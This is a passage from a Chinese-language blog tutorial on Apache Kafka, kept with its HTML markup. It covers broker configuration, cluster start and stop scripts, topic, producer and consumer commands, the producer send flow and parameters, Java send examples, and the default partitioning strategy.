class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#broker的全局唯一编号，不能重复，只能是数字。</span></span><br><span class="line"><span class="attr">broker.id</span>=<span class="string">0</span></span><br><span class="line"><span class="comment">#处理网络请求的线程数量</span></span><br><span class="line"><span class="attr">num.network.threads</span>=<span class="string">3</span></span><br><span class="line"><span class="comment">#用来处理磁盘 IO 的线程数量</span></span><br><span class="line"><span class="attr">num.io.threads</span>=<span class="string">8</span></span><br><span class="line"><span class="comment">#发送套接字的缓冲区大小</span></span><br><span class="line"><span class="attr">socket.send.buffer.bytes</span>=<span class="string">102400</span></span><br><span class="line"><span class="comment">#接收套接字的缓冲区大小</span></span><br><span class="line"><span class="attr">socket.receive.buffer.bytes</span>=<span class="string">102400</span></span><br><span class="line"><span class="comment">#请求套接字的缓冲区大小</span></span><br><span class="line"><span class="attr">socket.request.max.bytes</span>=<span class="string">104857600</span></span><br><span class="line"><span class="comment">#kafka运行日志(数据)存放的路径，路径不需要提前创建，kafka自动帮你创建，默认是/temp路径下，会被自动清理</span></span><br><span class="line"><span class="comment">#可以配置多个磁盘路径，路径与路径之间可以用&quot;，&quot;分隔，</span></span><br><span class="line"><span class="attr">log.dirs</span>=<span class="string">/opt/kafka/datas</span></span><br><span class="line"><span class="comment">#topic 在当前 broker 上的分区个数</span></span><br><span class="line"><span class="attr">num.partitions</span>=<span class="string">1</span></span><br><span class="line"><span class="comment">#用来恢复和清理 data 下数据的线程数量</span></span><br><span class="line"><span class="attr">num.recovery.threads.per.data.dir</span>=<span class="string">1</span></span><br><span class="line"><span class="comment"># 每个 topic 创建时的副本数，默认是 1 个副本</span></span><br><span class="line"><span class="attr">offsets.topic.replication.factor</span>=<span class="string">1</span></span><br><span class="line"><span class="comment">#segment文件保留的最长时间，超时将被删除</span></span><br><span class="line"><span class="attr">log.retention.hours</span>=<span class="string">168</span></span><br><span class="line"><span class="comment">#每个 segment 文件的大小，默认最大 1G</span></span><br><span class="line"><span class="attr">log.segment.bytes</span>=<span class="string">1073741824</span></span><br><span class="line"><span class="comment">#检查过期数据的时间，默认 5 分钟检查一次是否数据过期</span></span><br><span class="line"><span class="attr">log.retention.check.interval.ms</span>=<span class="string">300000</span></span><br><span class="line"><span class="comment">#配置连接 Zookeeper 集群地址（在 zk 根目录下创建/kafka，方便管理）</span></span><br><span class="line"><span class="attr">zookeeper.connect</span>=<span class="string">hadoop102:2181,hadoop103:2181,hadoop104:2181/kafka</span></span><br></pre></td></tr></table></figure><p>配置环境变量<code>vi /etc/profile</code>：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#KAFKA_HOME</span></span><br><span class="line"><span class="attr">export</span> <span class="string">KAFKA_HOME=/opt/kafka</span></span><br><span class="line"><span class="attr">export</span> <span class="string">PATH=$PATH:$KAFKA_HOME/bin</span></span><br></pre></td></tr></table></figure><p>使环境变量生效：<code>source /etc/profile</code></p><p>分发安装包以及环境变量文件，通过【<a href="https://blog.csdn.net/nalw2012/article/details/98322637">xsync同步脚本</a>】将文件分发到其他服务器上，注意修改broker.id，一个集群环境中不能重复。</p><h2 id="启动和停止"><a href="#启动和停止" class="headerlink" title="启动和停止"></a>启动和停止</h2><ul><li>先启动 Zookeeper 集群，然后启动 Kafka<ul><li><code>zk.sh start</code></li></ul></li></ul><ul><li><p>单节点启动Kafka，需依次在 hadoop102、hadoop103、hadoop104 节点上执行：</p><ul><li>-daemon 表示守护线程启动，再指定一个配置文件的路径</li><li><code>bin/kafka-server-start.sh -daemon config/server.properties</code></li></ul></li><li><p>单节点关闭Kafka，需依次在 hadoop102、hadoop103、hadoop104 节点上执行：</p><ul><li><code>bin/kafka-server-stop.sh</code></li></ul></li><li><p>可以写个shell脚本一键启动&#x2F;关闭集群服务，如果使用 ZK，那么在启动 kafka 之前一定要先启动 ZK：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/bash</span></span><br><span class="line">case $1 in</span><br><span class="line">&quot;start&quot;)</span><br><span class="line">for i in hadoop102 hadoop103 hadoop104</span><br><span class="line">  do</span><br><span class="line">  echo &quot;启动 $i kafka&quot;</span><br><span class="line">        ssh $i &quot;/opt/kafka/bin/kafka-server-start.sh -daemon /opt/kafka/config/server.properties&quot;</span><br><span class="line">  done</span><br><span class="line">;;</span><br><span class="line">&quot;stop&quot;)</span><br><span class="line">for i in hadoop102 hadoop103 hadoop104</span><br><span class="line">  do</span><br><span class="line">        echo &quot;停止 $i kafka&quot;</span><br><span class="line">        ssh $i &quot;/opt/kafka/bin/kafka-server-stop.sh&quot;</span><br><span class="line">  done</span><br><span class="line">;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure></li></ul><ul><li>查看kafka是否启动成功：<code>jps</code>，一个显示当前所有java进程pid的命令</li></ul><blockquote><p><strong>注意：</strong>停止 Kafka 集群时，一定要等 Kafka 所有节点进程全部停止后再停止 Zookeeper集群。因为 Zookeeper 集群当中记录着 Kafka 集群相关信息，Zookeeper 集群一旦先停止，Kafka 集群就没有办法再获取停止进程的信息，只能手动杀死 Kafka 进程了。</p></blockquote><h2 id="命令行操作"><a href="#命令行操作" class="headerlink" title="命令行操作"></a>命令行操作</h2><p> <strong>主题命令行操作</strong></p><p>查看操作主题命令参数：<code>[root@nanzx kafka]# bin/kafka-topics.sh</code></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>–bootstrap-server &lt;String: server toconnect to&gt;</td><td>连接的 Kafka Broker 主机名称和端口号。</td></tr><tr><td>–topic &lt;String: topic&gt;</td><td>操作的 topic 名称。</td></tr><tr><td>–create</td><td>创建主题。</td></tr><tr><td>–delete</td><td>删除主题。</td></tr><tr><td>–alter</td><td>修改主题。</td></tr><tr><td>–list</td><td>查看所有主题。</td></tr><tr><td>–describe</td><td>查看主题详细描述。</td></tr><tr><td>–partitions &lt;Integer: # of partitions&gt;</td><td>设置分区数。</td></tr><tr><td>–replication-factor&lt;Integer: replication factor&gt;</td><td>设置分区副本。</td></tr><tr><td>–config &lt;String: name&#x3D;value&gt;</td><td>更新系统默认的配置。</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建主题</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--partitions 定义分区数</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--replication-factor 定义副本数</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--topic 定义 topic 名</span></span><br><span class="line">[root@nanzx kafka]# bin/kafka-topics.sh --bootstrap-server localhost:9092 --create --partitions 1 --replication-factor 1 --topic firstTopic</span><br><span class="line">Created topic firstTopic.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看所有主题</span></span><br><span class="line">[root@nanzx kafka]# bin/kafka-topics.sh --bootstrap-server localhost:9092 --list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看主题的详情</span></span><br><span class="line">[root@nanzx kafka]# bin/kafka-topics.sh --bootstrap-server localhost:9092 --describe --topic firstTopic</span><br><span class="line">Topic: firstTopicTopicId: tuPooPIlRq6nLJw4Yi-XkQPartitionCount: 1ReplicationFactor: 1Configs: segment.bytes=1073741824</span><br><span class="line">Topic: firstTopicPartition: 0Leader: 0Replicas: 0Isr: 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改分区数，分区数只能增加，不能减少</span></span><br><span class="line">[root@nanzx kafka]# bin/kafka-topics.sh --bootstrap-server localhost:9092 --alter --topic firstTopic  --partitions 3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">再次查看主题的详情</span></span><br><span class="line">[root@nanzx kafka]# bin/kafka-topics.sh --bootstrap-server localhost:9092 --describe --topic firstTopic</span><br><span class="line">Topic: firstTopicTopicId: tuPooPIlRq6nLJw4Yi-XkQPartitionCount: 3ReplicationFactor: 1Configs: segment.bytes=1073741824</span><br><span class="line">Topic: firstTopicPartition: 0Leader: 0Replicas: 0Isr: 0</span><br><span class="line">Topic: firstTopicPartition: 1Leader: 0Replicas: 0Isr: 0</span><br><span class="line">Topic: firstTopicPartition: 2Leader: 0Replicas: 0Isr: 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除主题</span></span><br><span class="line">[root@nanzx kafka]# bin/kafka-topics.sh --bootstrap-server localhost:9092 --delete --topic firstTopic</span><br></pre></td></tr></table></figure><hr><p><strong>生产者命令行操作</strong></p><p>查看操作生产者命令参数：<code>bin/kafka-console-producer.sh</code></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>–bootstrap-server &lt;String: server toconnect to&gt;</td><td>连接的 Kafka Broker 主机名称和端口号。</td></tr><tr><td>–topic &lt;String: topic&gt;</td><td>操作的 topic 名称。</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">发送消息</span></span><br><span class="line">[root@nanzx kafka]# bin/kafka-console-producer.sh --bootstrap-server localhost:9092 --topic firstTopic</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">hello nan</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">nanzx.top</span></span><br></pre></td></tr></table></figure><hr><p><strong>消费者命令行操作</strong></p><p>查看操作消费者命令参数：<code>bin/kafka-console-consumer.sh</code></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>–bootstrap-server &lt;String: server toconnect to&gt;</td><td>连接的 Kafka Broker 主机名称和端口号。</td></tr><tr><td>–topic &lt;String: topic&gt;</td><td>操作的 topic 名称。</td></tr><tr><td>–from-beginning</td><td>从头开始消费。</td></tr><tr><td>–group &lt;String: consumer group id&gt;</td><td>指定消费者组名称。</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">消费主题中的数据, --from-beginning可以把主题中所有的数据都读取出来（包括历史数据）</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[root@nanzx kafka]# bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --from-beginning --topic firstTopic</span></span><br><span class="line">hello nan</span><br><span class="line">nanzx.top</span><br></pre></td></tr></table></figure><h1 id="Kafka-生产者"><a href="#Kafka-生产者" class="headerlink" title="Kafka 生产者"></a>Kafka 生产者</h1><h2 id="消息发送流程"><a href="#消息发送流程" class="headerlink" title="消息发送流程"></a>消息发送流程</h2><p>在消息发送的过程中，涉及到了两个线程：<strong>main 线程和 sender 线程</strong>。在 main 线程中创建了一个<strong>双端队列 RecordAccumulator</strong>（默认 32 m，由内存池分配空间）。main 线程将消息发送给 RecordAccumulator，sender 线程不断从 RecordAccumulator 中拉取消息发送到 Kafka Broker。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220226192238.png"></p><p><strong>main线程：</strong></p><ol><li><p>在 main 线程中创建 Producer 对象，Producer 调用 send 方法，经过拦截器（可选项，建议不用），拦截器可以对数据进行加工包装（例：Flume 拦截器）</p></li><li><p>随后经过序列化器，对数据进行传输前的<a href="https://blog.csdn.net/tree_ifconfig/article/details/82766587?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164587532316780271917661%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164587532316780271917661&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-82766587.pc_search_result_cache&utm_term=%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4187">序列化</a>操作，转换为可存储和传输的字节序列。不使用Java序列化器是因为会携带大量辅助和保证安全传输的数据，在大数据场景下不适用。</p></li><li><p>接着是分区器，分区器会判断要将数据发送到哪一个分区，并将数据（每16K一批）放到不同分区对应的DQuene（一个分区创建一个DQuene，方便数据的管理）中</p></li></ol><p><strong>sender 线程：</strong></p><ol><li>当RecordAccumulator中的数据积累到<code>batch.size</code>（默认16k）或者数据迟迟未达到 <code>batch.size</code>，而Sender 已经等待 <code>linger.time</code> （默认是0ms，表示没有延迟）之后 Sender 线程就会从缓存双端队列中拉取并发送数据。</li><li>Sender 线程将拉取的数据封装成请求并放到 Broker 对应的发送队列中，发送到 Kafka 集群的某个节点，默认每个 broker 节点最多缓存5个请求。</li><li>由 Selector 进行发送操作，kafka 集群收到数据之后就会同步到对应的<strong>副本</strong>当中，同时也会提供 ACK 应答机制：<ol><li>0表示生产者发送过来的数据，不需要等数据落盘应答。</li><li>1表示生产者发送过来的数据，Leader收到数据后应答。</li><li>-1或all表示生产者发送过来的数据，Leader和ISR队列里面的所有节点（可以理解成所有副本）收齐数据后应答。</li></ol></li><li>Selector 反馈是成功时，清理 Broker 对应的发送队列中的请求，同时清理双端队列对应的分区数据，反馈是失败时，则会重新发送请求，默认次数是Int类型的最大值（无限，可以修改）</li></ol><hr><h2 id="生产者重要参数列表"><a href="#生产者重要参数列表" class="headerlink" title="生产者重要参数列表"></a>生产者重要参数列表</h2><table><thead><tr><th>参数名称</th><th>描述</th></tr></thead><tbody><tr><td>bootstrap.servers</td><td>生产者连接集群所需的broker地址清 单 。例如hadoop102:9092,hadoop103:9092,hadoop104:9092，可以中间用逗号隔开。注意这里并非需要所有的 broker 地址，因为生产者可以从给定的 broker里查找到其他 broker 信息。</td></tr><tr><td>key.serializer 和 value.serializer</td><td>指定发送消息的 key 和 value 的序列化类型。一定要写全类名。</td></tr><tr><td>buffer.memory</td><td>RecordAccumulator 缓冲区总大小，<strong>默认32m</strong>。</td></tr><tr><td>batch.size</td><td>缓冲区一批数据最大值，<strong>默认16k</strong>。适当增加该值，可以提高吞吐量，但是如果该值设置太大，会导致数据传输延迟增加。</td></tr><tr><td>linger.ms</td><td>如果数据迟迟未达到 batch.size，sender 等待 linger.time之后就会发送数据。单位ms，<strong>默认值是 0ms</strong>，表示没有延迟。生产环境建议该值大小为 5-100ms 之间。</td></tr><tr><td>acks</td><td>0：生产者发送过来的数据，不需要等数据落盘应答。<br/>1：生产者发送过来的数据，Leader 收到数据后应答。<br/>-1（all）：生产者发送过来的数据，Leader+和 isr 队列里面的所有节点收齐数据后应答。<br/><strong>默认值是-1</strong>，-1 和all 是等价的。</td></tr><tr><td>max.in.flight.requests.per.connection</td><td>允许最多没有返回 ack 的次数，<strong>默认为 5</strong>，开启幂等性要保证该值是 1-5 的数字。</td></tr><tr><td>retries</td><td>当消息发送出现错误的时候，系统会重发消息。retries表示重试次数。<strong>默认是 int 最大值，</strong>2147483647。<br/>如果设置了重试，还想保证消息的有序性，需要设置MAX_IN_FLIGHT_REQUESTS_PER_CONNECTION&#x3D;1<br/>否则在重试此失败消息的时候，其他的消息可能发送成功了。</td></tr><tr><td>retry.backoff.ms</td><td>两次重试之间的时间间隔，默认是 100ms。</td></tr><tr><td>enable.idempotence</td><td>是否开启幂等性，<strong>默认 true，开启幂等性</strong>。</td></tr><tr><td>compression.type</td><td>生产者发送的所有数据的压缩方式。<strong>默认是 none，也就是不压缩</strong>。   支持压缩类型：none、gzip、snappy、lz4 和 zstd。</td></tr></tbody></table><h2 id="异步发送API"><a href="#异步发送API" class="headerlink" title="异步发送API"></a>异步发送API</h2><p><strong>普通异步发送：</strong></p><p>异步发送指的是外部数据发送到双端队列 RecordAccumulator，不需要等待前一批数据成功发送到kafka后才发送。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220226192238.png"></p><p>引入kafka相关依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kafka-clients<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写不带回调函数的 API 代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">CustomProducer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 创建 kafka 生产者的配置对象</span></span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 给 kafka 配置对象添加配置信息：bootstrap.servers</span></span><br><span class="line">    properties.setProperty(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, <span class="string">&quot;192.168.2.110:9092&quot;</span>);</span><br><span class="line">    <span class="comment">// key,value 序列化（必须）</span></span><br><span class="line">    properties.setProperty(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());</span><br><span class="line">    properties.setProperty(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 创建 kafka 生产者对象</span></span><br><span class="line">    KafkaProducer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;String, String&gt;(properties);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 调用 send 方法,发送消息</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        producer.send(<span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;&gt;(<span class="string">&quot;firstTopic&quot;</span>, <span class="string">&quot;Test&quot;</span> + i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 关闭资源</span></span><br><span class="line">    producer.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试：在 IDEA 中执行代码，观察虚拟机控制台中是否接收到消息。</p><hr><p><strong>带回调函数的异步发送：</strong></p><p>回调函数会在 producer 收到 ack （双端队列发送的）时调用，为异步调用，该方法有两个参数，分别是元数据信息（RecordMetadata）和异常信息（Exception），如果 Exception 为 null，说明消息发送成功，如果 Exception 不为 null，说明消息发送失败。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">CustomProducerCallback</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">       <span class="comment">// 1. 创建 kafka 生产者的配置对象</span></span><br><span class="line">       <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 2. 给 kafka 配置对象添加配置信息：bootstrap.servers</span></span><br><span class="line">       properties.setProperty(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, <span class="string">&quot;192.168.2.110:9092&quot;</span>);</span><br><span class="line">       <span class="comment">// key,value 序列化（必须）</span></span><br><span class="line">       properties.setProperty(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());</span><br><span class="line">       properties.setProperty(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 3. 创建 kafka 生产者对象</span></span><br><span class="line">       KafkaProducer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;String, String&gt;(properties);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 4. 调用 send 方法,发送消息</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">           producer.send(<span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;&gt;(<span class="string">&quot;firstTopic&quot;</span>, <span class="string">&quot;Test&quot;</span> + i), <span class="keyword">new</span> <span class="title class_">Callback</span>() &#123;</span><br><span class="line">               <span class="meta">@Override</span></span><br><span class="line">               <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCompletion</span><span class="params">(RecordMetadata recordMetadata, Exception exception)</span> &#123;</span><br><span class="line">                   <span class="keyword">if</span> (exception == <span class="literal">null</span>) &#123;</span><br><span class="line">                       <span class="comment">// 没有异常,输出信息到控制台</span></span><br><span class="line">                       System.out.println(<span class="string">&quot; 主题： &quot;</span> + recordMetadata.topic() + <span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;分区：&quot;</span> + recordMetadata.partition());</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       <span class="comment">// 出现异常打印</span></span><br><span class="line">                       exception.printStackTrace();</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 延迟一会会看到数据发往不同分区</span></span><br><span class="line">           Thread.sleep(<span class="number">2</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 5. 关闭资源</span></span><br><span class="line">       producer.close();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="同步发送API"><a href="#同步发送API" class="headerlink" title="同步发送API"></a>同步发送API</h2><p>同步发送指的是外部数据发送到双端队列 RecordAccumulator，需要等待前一批数据成功发送到kafka后才发送。</p><p>只需在异步发送的基础上，再调用一下 get()方法即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">CustomProducerSync</span><span class="params">()</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">    <span class="comment">// 1. 创建 kafka 生产者的配置对象</span></span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 给 kafka 配置对象添加配置信息：bootstrap.servers</span></span><br><span class="line">    properties.setProperty(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, <span class="string">&quot;192.168.2.110:9092&quot;</span>);</span><br><span class="line">    <span class="comment">// key,value 序列化（必须）</span></span><br><span class="line">    properties.setProperty(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());</span><br><span class="line">    properties.setProperty(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 创建 kafka 生产者对象</span></span><br><span class="line">    KafkaProducer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;String, String&gt;(properties);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 调用 send 方法,发送消息</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        producer.send(<span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;&gt;(<span class="string">&quot;firstTopic&quot;</span>, <span class="string">&quot;Test&quot;</span> + i)).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 关闭资源</span></span><br><span class="line">    producer.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分区策略"><a href="#分区策略" class="headerlink" title="分区策略"></a>分区策略</h2><p>Kafka分区的好处：</p><ul><li><p><strong>便于合理使用存储资源</strong>，每个Partition在一个Broker上存储，可以把海量的数据按照分区切割成一块一块数据存储在多台Broker上。合理控制分区的任务，可以实现负载均衡的效果。 </p></li><li><p><strong>提高并行度</strong>，生产者可以以分区为单位发送数据；消费者可以以分区为单位进行消费数据，不同分区之间互不干扰。</p></li></ul><hr><p>KafkaProducer的默认的分区器是 <strong>DefaultPartitioner</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The default partitioning strategy:</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;If a partition is specified in the record, use it</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;If no partition is specified but a key is present choose a partition based on a hash of the key</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;If no partition or key is present choose the sticky partition that changes when the batch is full.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * See KIP-480 for details about sticky partitioning.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultPartitioner</span> <span class="keyword">implements</span> <span class="title class_">Partitioner</span> &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>默认的分区策略是：</p><ul><li>指明partition的情况下，<strong>直接将指明的值作为partition值</strong>；例如partition&#x3D;0，所有数据写入分区0</li><li>没有指明partition值但有key的情况下，将key的hash值与topic的partition数进行<strong>取余</strong>得到partition值；<ul><li>例如：key1的hash值&#x3D;5， key2的hash值&#x3D;6 ，topic的partition数&#x3D;2，那 么key1 对应的value1写入1号分区，key2对应的value2写入0号分区。</li></ul></li><li>既没有partition值又没有key值的情况下，Kafka采用<strong>Sticky 